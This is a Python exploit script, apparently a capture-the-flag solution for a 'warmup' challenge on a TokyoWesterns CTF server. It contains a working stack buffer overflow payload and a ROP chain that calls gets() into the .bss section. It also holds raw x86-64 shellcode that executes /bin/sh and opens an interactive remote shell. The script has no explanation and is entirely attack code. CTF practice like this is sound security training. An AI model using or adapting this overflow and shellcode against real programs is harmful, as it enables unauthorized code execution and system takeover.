from ptrlib import *

#sock = Process("./warmup-b8fa17414a043a62ba16fdeb4f82051d35fc6f434f7130d6d988d6c2d312e73e")
sock = Socket("nothing.chal.ctf.westerns.tokyo", 10001)
elf = ELF("./warmup-b8fa17414a043a62ba16fdeb4f82051d35fc6f434f7130d6d988d6c2d312e73e")
rop_pop_rdi = 0x00400773
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

payload = b"A" * 0x108
payload += p64(rop_pop_rdi)
payload += p64(elf.section(".bss") + 0x400)
payload += p64(elf.plt("gets"))
payload += p64(elf.section(".bss") + 0x400)
sock.sendline(payload)

sock.sendline(shellcode)

sock.interactive()
